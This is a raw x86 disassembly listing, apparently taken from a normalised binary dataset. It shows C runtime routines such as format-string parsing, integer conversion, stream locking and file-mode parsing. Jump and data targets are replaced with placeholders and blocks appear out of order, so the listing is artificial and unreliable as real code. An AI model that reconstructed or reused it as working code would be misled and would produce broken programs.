and [ ecx + 0x70 ] 0xfffffffd
push 0x58
lea eax [ ecx - 0x20 ]
pop edi
cmp ax di
ja r-xdata
xor eax eax
movzx eax cx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov eax [ ebp - 0x408 ]
jmp [ eax * 4 + jump_table_413118 ]
mov edi [ ebp - 0x434 ]
movsx edi [ edi + eax * 8 + r--data ]
mov eax edi
sar eax 0x4
mov [ ebp - 0x434 ] edi
mov edi [ ebp - 0x40c ]
mov [ ebp - 0x434 ] eax
cmp eax 0x7
ja r-xdata
add [ ebp - 0x408 ] 0x2
test eax eax
js r-xdata
xor eax eax
or [ ebp - 0x418 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x440 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x430 ] eax
jmp r-xdata
movzx eax cx
push 0x20
pop ecx
sub eax ecx
je r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
xor eax eax
mov [ ebp - 0x418 ] eax
jmp r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
mov [ ebp - 0x430 ] 0x1
push ecx
call sub_413138
add esp 0xc
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x424 ]
imul eax eax 0xa
mov [ ebp - 0x424 ] eax
movzx eax cx
mov ecx [ ebp - 0x424 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x424 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x424 ] eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x418 ]
imul eax eax 0xa
mov [ ebp - 0x418 ] eax
movzx eax cx
mov ecx [ ebp - 0x418 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x418 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] eax
test eax eax
mov eax [ ebp - 0x408 ]
mov [ ebp - 0x40c ] edi
jns r-xdata
mov eax [ ebp - 0x408 ]
movzx eax [ eax ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
mov edx [ ebp - 0x414 ]
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or ebx 0x4
neg eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
jmp r-xdata
movzx ecx [ eax ]
mov eax [ ebp - 0x420 ]
mov [ ebp - 0x41c ] ecx
test cx cx
jne r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x34
jne r-xdata
push 0x20
pop eax
or ebx eax
jmp r-xdata
push 0x6c
pop ecx
cmp eax ecx
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x410 ] ebx
cmp eax 0x53
jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp ax [ ebp - 0x47c ]
je r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x32
jne r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
or ebx 0x8000
jmp r-xdata
mov eax [ ebp - 0x408 ]
cmp [ eax ] cx
jne r-xdata
cmp eax 0x77
mov eax [ ebp - 0x408 ]
jne r-xdata
mov eax [ ebp - 0x418 ]
mov edi 0x7fffffff
cmp eax 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x418 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x408 ]
jne r-xdata
cmp ax [ ebp - 0x480 ]
je r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
and ebx 0xffff7fff
jmp r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
add eax 0x2
mov [ ebp - 0x408 ] eax
or ebx 0x1000
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ ebp - 0x40c ]
add esi 0x4
mov [ ebp - 0x40c ] esi
mov esi [ esi - 0x4 ]
test bl 0x20
je r-xdata
mov edi eax
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
pop eax
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x41c ] 0x10
test bl bl
jns r-xdata
cmp [ ebp - 0x440 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
xor eax eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp ax [ ebp - 0x468 ]
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
push 0x30
pop ecx
add eax 0x51
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x42c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x458 ]
test eax eax
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp - 0x418 ]
or ebx 0x40
mov edx 0x200
mov [ ebp - 0x410 ] ebx
lea esi [ ebp - 0x404 ]
mov [ ebp - 0x414 ] edx
test eax eax
jns r-xdata
push 0x69
pop ecx
cmp eax ecx
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
push 0x20
pop eax
add ecx eax
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x41c ] ecx
dec eax
dec eax
je r-xdata
cmp eax 0x75
je r-xdata
mov [ ebp - 0x430 ] 0x1
mov edx esi
test edi edi
je r-xdata
mov esi [ rw-data ]
xor ecx ecx
mov eax esi
mov edx ecx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
test edi edi
jle r-xdata
mov esi [ rw-data ]
push eax
call sub_40f402
xor eax eax
pop ecx
mov [ ebp - 0x458 ] eax
push 0x20
pop ecx
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x418 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi eax
jg r-xdata
mov ecx [ edi - 0x4 ]
xor eax eax
mov edi eax
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp eax 0x78
je r-xdata
sub edx esi
xor eax eax
mov al [ eax ]
test al al
je r-xdata
push [ ebp - 0x464 ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call sub_41319a
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push ecx
call sub_41316e
mov eax [ ebp - 0x42c ]
add esp 0x10
test bl 0x1
je r-xdata
push 0x2d
cmp eax edx
jle r-xdata
push 0x67
pop eax
cmp cx ax
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x488 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x484 ] eax
lea eax [ ebp - 0x450 ]
push eax
push [ ebp - 0x460 ]
movsx eax cl
push [ ebp - 0x418 ]
mov [ ebp - 0x40c ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x488 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
call sub_41996e
test eax eax
je r-xdata
push 0x6f
pop ecx
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x418 ]
test edx edx
jns r-xdata
mov edi eax
jl r-xdata
cdq
mov ecx eax
mov edi edx
mov [ ebp - 0x414 ] edx
test ebx 0x800
je r-xdata
movzx eax [ edi ]
add edi 0x4
mov [ ebp - 0x430 ] 0x1
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x45c ] eax
test bl 0x20
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp ax [ ebp - 0x474 ]
je r-xdata
add edx 0x2
test edi edi
jne r-xdata
lea ecx [ ebp - 0x450 ]
movzx eax al
push ecx
push eax
call sub_416b3c
pop ecx
test eax eax
mov eax [ ebp - 0x41c ]
pop ecx
je r-xdata
cmp [ ebp - 0x430 ] 0x0
mov eax [ ebp - 0x414 ]
jne r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
push 0x2b
jmp r-xdata
cmp eax 0xa3
jle r-xdata
mov eax edx
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x418 ] 0x1
jmp r-xdata
push 0x67
pop eax
cmp [ ebp - 0x41c ] ax
jne r-xdata
cmp [ ebp - 0x418 ] 0x0
jne r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
cmp [ ebp - 0x444 ] 0x0
je r-xdata
mov eax [ ebp - 0x420 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x41c ] 0x8
test bl bl
jns r-xdata
and ebx 0xfffffff7
mov [ ebp - 0x410 ] ebx
cmp edx 0x200
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi eax
neg edi
or ebx 0x100
mov [ ebp - 0x410 ] ebx
cmp ecx eax
jae r-xdata
movsx edx [ eax ]
xor ecx ecx
mov [ ebp - 0x430 ] ecx
jmp r-xdata
movsx eax [ eax ]
cdq
sub eax edx
mov edx eax
mov [ ebp - 0x430 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x43c ] al
xor eax eax
mov [ ebp - 0x43b ] al
lea eax [ ebp - 0x450 ]
push eax
mov eax [ ebp - 0x450 ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_419b08
add esp 0x10
test eax eax
jns r-xdata
xor eax eax
mov [ ebp - 0x434 ] eax
dec edi
cmp [ edx ] ax
je r-xdata
mov edx [ ebp - 0x414 ]
inc eax
inc edx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
cmp edx edi
jl r-xdata
inc eax
push [ ebp - 0x464 ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
push esi
call sub_41319a
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x30
pop eax
push eax
call sub_41316e
add esp 0x10
push 0x20
pop ecx
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x42c ] 0x1
lea edi [ eax + 0x15d ]
push edi
call sub_411b1b
pop ecx
mov ecx [ ebp - 0x41c ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x450 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov ecx [ ebp - 0x448 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x410 ] ebx
jmp r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx 0x200
sar edx 0x1
xor edx edx
lea esi [ ebp - 0x404 ]
inc edx
jmp r-xdata
mov [ ebp - 0x440 ] 0x1
jmp r-xdata
jmp r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x41c ] esi
mov edi [ ebp - 0x424 ]
mov eax [ ebp - 0x42c ]
sub edi edx
sub edi eax
test bl 0xc
jne r-xdata
mov [ ebp - 0x418 ] 0xa3
mov esi eax
mov [ ebp - 0x414 ] edi
jmp r-xdata
push esi
call sub_411260
pop ecx
mov edx eax
jmp r-xdata
or ebx 0x100
mov [ ebp - 0x410 ] ebx
inc esi
jmp r-xdata
lea eax [ ebp - 0x450 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x440 ] 0x1
jmp r-xdata
lea esi [ ebp - 0x205 ]
mov [ ebp - 0x42c ] eax
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x20
pop eax
push eax
call sub_41316e
add esp 0x10
or eax 0xffffffff
mov [ ebp - 0x420 ] eax
jmp r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push [ ebp - 0x45c ]
call sub_413138
mov ecx [ ebp - 0x41c ]
add ecx [ ebp - 0x478 ]
mov eax [ ebp - 0x46c ]
add esp 0xc
mov [ ebp - 0x41c ] ecx
test eax eax
jg r-xdata
mov edi [ ebp - 0x40c ]
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ecx
call sub_419c20
add ecx 0x30
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x414 ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
test eax eax
js r-xdata
dec eax
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x450 ]
push eax
mov eax [ ebp - 0x450 ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x45c ]
push ecx
push eax
call sub_419b08
add esp 0x10
mov [ ebp - 0x478 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov edx [ ebp - 0x418 ]
mov [ esi ] cl
mov ecx [ ebp - 0x414 ]
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
mov ebx [ ebp - 0x410 ]
lea edx [ ebp - 0x205 ]
sub edx esi
inc esi
mov [ ebp - 0x414 ] edx
test ebx 0x200
je r-xdata
mov eax [ ebp - 0x420 ]
mov eax edx
dec edx
mov [ ebp - 0x418 ] edx
test eax eax
jg r-xdata
test edx edx
je r-xdata
dec esi
push 0x30
pop eax
mov [ esi ] al
inc edx
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
sub_413138
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_419983
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
inc [ eax ]
pop ebp
retn
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
pop ebp
retn
sub_41316e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
test esi esi
jg r-xdata
push edi
push [ ebp + 0x10 ]
dec esi
push [ ebp + 0x8 ]
call sub_413138
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_41319a
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x10 ]
mov eax [ esi ]
test [ edi + 0xc ] 0x40
mov [ ebp + 0x18 ] eax
je r-xdata
and [ esi ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
jle r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
test ebx ebx
jg r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop edi
pop esi
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
push edi
movzx eax [ eax ]
push eax
dec ebx
call sub_413138
mov eax [ ebp + 0x14 ]
add [ ebp + 0x8 ] 0x2
add esp 0xc
cmp [ eax ] 0xffffffff
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
push eax
push edi
push 0x3f
call sub_413138
mov eax [ ebp + 0x14 ]
add esp 0xc
pop ebx
mov eax [ ebp + 0x18 ]
sub_413213
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test eax eax
je r-xdata
test ecx ecx
jne r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
xor eax eax
leave
retn
push ebx
push esi
push edi
movzx edi [ ecx ]
xor ebx ebx
lea esi [ ecx + 0x2 ]
jmp r-xdata
cmp eax 0x2
jl r-xdata
push 0x8
push edi
call sub_419cb5
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp eax 0x24
jg r-xdata
movzx edi [ esi ]
add esi 0x2
mov eax [ ebp + 0x14 ]
cmp di 0x2d
jne r-xdata
cmp di 0x2b
jne r-xdata
or eax 0x2
jmp r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
movzx edi [ esi ]
add esi 0x2
cmp eax 0x10
jne r-xdata
push edi
call sub_419d07
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
push edi
call sub_419d07
pop ecx
test eax eax
jne r-xdata
movzx eax [ esi ]
push 0x78
pop ecx
cmp ax cx
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
cmp edx ecx
jae r-xdata
push 0x41
pop eax
cmp ax di
ja r-xdata
movzx eax [ esi ]
push 0x78
pop ecx
cmp ax cx
je r-xdata
push 0x10
pop eax
mov [ ebp + 0x10 ] eax
push 0x58
pop ecx
cmp ax cx
je r-xdata
mov edi [ ebp + 0xc ]
mov edi [ ebp - 0x8 ]
or eax 0x8
mov [ ebp - 0x4 ] eax
cmp ebx edi
jb r-xdata
push 0x19
lea eax [ edi - 0x61 ]
pop ecx
cmp ax cx
jbe r-xdata
cmp di 0x5a
jbe r-xdata
movzx edi [ esi + 0x2 ]
add esi 0x4
push 0x58
pop ecx
cmp ax cx
jne r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
test al 0x4
jne r-xdata
test edi edi
je r-xdata
imul ebx ecx
add ebx edx
jne r-xdata
lea eax [ edi - 0x61 ]
movzx edx di
cmp ax cx
ja r-xdata
mov eax [ ebp - 0x4 ]
push 0x19
pop ecx
call sub_412060
mov [ eax ] 0x22
mov eax [ ebp - 0x4 ]
test al 0x1
je r-xdata
test al 0x1
jne r-xdata
xor ebx ebx
jmp r-xdata
mov esi [ ebp + 0x8 ]
push edi
call sub_419d07
mov edx eax
pop ecx
cmp edx 0xffffffff
jne r-xdata
mov edi [ ebp + 0xc ]
or eax 0x4
mov [ ebp - 0x4 ] eax
test edi edi
je r-xdata
cmp edx [ ebp - 0xc ]
jbe r-xdata
add edx 0xffffffc9
sub edx 0x20
push 0x0
test al 0x2
pop ebx
setne bl
add ebx 0x7fffffff
or ebx 0xffffffff
jmp r-xdata
test edi edi
je r-xdata
mov ecx eax
and ecx 0x2
je r-xdata
sub esi 0x2
test al 0x8
jne r-xdata
jmp r-xdata
test al 0x2
je r-xdata
mov [ edi ] esi
test ecx ecx
jne r-xdata
cmp ebx 0x80000000
ja r-xdata
movzx edi [ esi ]
add esi 0x2
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
neg ebx
cmp ebx 0x7fffffff
jbe r-xdata
sub_413407
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_411ad1
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_411ad1
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ rw-data ]
jmp r-xdata
push 0x1a
pop eax
pop esi
retn
mov [ edx + eax ] ecx
add ecx 0x20
lea edx [ edx + 0x4 ]
cmp ecx rw-data
jge r-xdata
sub_4134a7
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov ecx rw-data
cmp esi ecx
jb r-xdata
lea eax [ esi + 0x20 ]
push eax
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov eax esi
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_416df0
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_4134e6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_416df0
mov eax [ ebp + 0xc ]
pop ecx
or [ eax + 0xc ] 0x8000
pop ebp
retn
sub_413516
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_416f54
pop ecx
pop ebp
retn
sub_413550
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
cmp ecx 0x14
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
lea eax [ ecx + 0x10 ]
push eax
call sub_416f54
pop ecx
pop ebp
retn
sub_41357d
push 0x10
push r--data
call sub_411bb0
xor ebx ebx
mov esi ebx
mov [ ebp - 0x1c ] esi
push 0x1
call sub_416df0
pop ecx
mov [ ebp - 0x4 ] ebx
mov edi ebx
test esi esi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41368c
mov eax esi
call sub_411bf5
retn
and [ esi + 0xc ] 0x8000
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi ] ebx
mov [ esi + 0x1c ] ebx
or [ esi + 0x10 ] 0xffffffff
push 0x38
call sub_411b1b
pop ecx
mov ecx eax
mov eax [ rw-data ]
mov [ eax + edi * 4 ] ecx
test ecx ecx
je r-xdata
test [ eax + 0xc ] 0x83
jne r-xdata
push 0xfa0
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
add eax 0x20
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov esi [ eax + edi * 4 ]
mov [ ebp - 0x1c ] esi
mov [ esi + 0xc ] ebx
inc edi
jmp r-xdata
test [ eax + 0xc ] 0x8000
jne r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
lea eax [ edi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + edi * 4 ]
push edi
call sub_4134e6
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + edi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ edi + 0x10 ]
push eax
call sub_416e78
pop ecx
test eax eax
je r-xdata
mov esi eax
mov [ ebp - 0x1c ] esi
jmp r-xdata
push eax
push edi
call sub_413550
pop ecx
pop ecx
sub_413695
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ rw-data ]
xor ecx ecx
push 0x20
mov edx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
pop eax
jmp r-xdata
cmp [ esi ] ax
je r-xdata
add esi 0x2
movzx eax [ esi ]
cmp eax 0x61
je r-xdata
mov ebx 0x109
cmp eax 0x72
je r-xdata
push 0x20
pop eax
jmp r-xdata
mov [ ebp + 0xc ] 0x1000
mov ebx ecx
or edi 0x1
jmp r-xdata
cmp eax 0x77
je r-xdata
cmp [ esi ] ax
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
movzx eax ax
cmp eax 0x53
jg r-xdata
add esi 0x2
xor ecx ecx
movzx eax [ esi ]
inc ecx
test ax ax
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
add esi 0x2
xor eax eax
cmp [ esi ] ax
jne r-xdata
push 0x20
pop eax
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or edi 0x2
pop edi
pop esi
pop ebx
leave
retn
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_41a82a
add esp 0x14
test eax eax
jne r-xdata
cmp [ esi ] ax
je r-xdata
mov eax [ ebp + 0xc ]
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
xor eax eax
jmp r-xdata
inc [ rw-data ]
mov eax [ ebp + 0x14 ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0xc ] edi
mov [ eax + 0x10 ] ecx
add esi 0x2
push 0x3
push esi
push r--data
call sub_41a848
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x20
jmp r-xdata
add esi 0x2
movzx eax [ esi ]
test ax ax
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x6
pop eax
jmp r-xdata
test ecx ecx
je r-xdata
or ebx 0x8000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] ax
je r-xdata
inc edx
or edi 0x4000
jmp r-xdata
test edx edx
jne r-xdata
sub eax 0x6
jne r-xdata
and ebx 0xfffffffe
and edi 0xfffffffc
or ebx 0x2
or edi 0x80
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
add esi 0x2
cmp [ esi ] 0x3d
jne r-xdata
inc edx
and edi 0xffffbfff
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
add esi 0x2
cmp [ esi ] ax
je r-xdata
or ebx 0x4000
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_41a87e
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] eax
jne r-xdata
push 0x8
push r--data
push esi
call sub_41a87e
add esp 0xc
test eax eax
jne r-xdata
add esi 0xa
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_41a87e
add esp 0xc
test eax eax
jne r-xdata
add esi 0x10
or ebx 0x20000
jmp r-xdata
add esi 0xe
or ebx 0x10000
sub_413940
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_4139d0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_41ab45
